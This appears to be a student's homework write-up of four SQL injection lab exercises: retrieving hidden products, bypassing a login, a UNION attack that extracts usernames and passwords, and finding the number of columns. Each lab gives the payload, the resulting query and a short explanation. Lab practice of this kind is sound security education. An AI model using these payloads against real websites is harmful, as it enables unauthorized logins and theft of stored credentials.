
# SQL Injection Homework – Week 9

## Lab 1 – Retrieve Hidden Data

**Status:** Solved

**Payload:**
`Corporate gifts' OR 1=1--`

**SQL Query:**
```sql
SELECT * FROM products
WHERE category = 'Corporate gifts' OR 1=1--'
AND released = 1;
```

**Explanation:**

The condition 1=1 is always true. The -- comments out the released check, allowing hidden products to be displayed.
¨
## Lab 2 – Login Bypass

**Status:** Solved

**Payload:**
`administrator'--`

**SQL Query:**
```sql
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = 'test123';
```

**Explanation:**

The payload comments out the password check.
This allows login as administrator without the correct password.

## Lab 3 – UNION Attack: Retrieve Data from Other Tables

**Status:** Solved

**Payload:**
`Gifts' UNION SELECT username,password FROM users--`

**SQL Query:**
```sql
SELECT name, description FROM products
WHERE category = 'Gifts'
UNION SELECT username, password FROM users--';
```

**Explanation:**

The UNION SELECT combines product results with data from the users table. This exposed the administrator credentials, which were used to log in.

## Lab 4 – Determine the Number of Columns

**Status:** Solved

**Payload:**
`Gifts' UNION SELECT NULL,NULL,NULL--`

**SQL Query:**
```sql
SELECT * FROM products
WHERE category = 'Gifts'
UNION SELECT NULL, NULL, NULL--';
```

**Explanation:**

ORDER BY 3 worked, but ORDER BY 4 caused an error.
This confirmed that the query returns 3 columns.
UNION SELECT with three NULL values worked because the number of columns matched.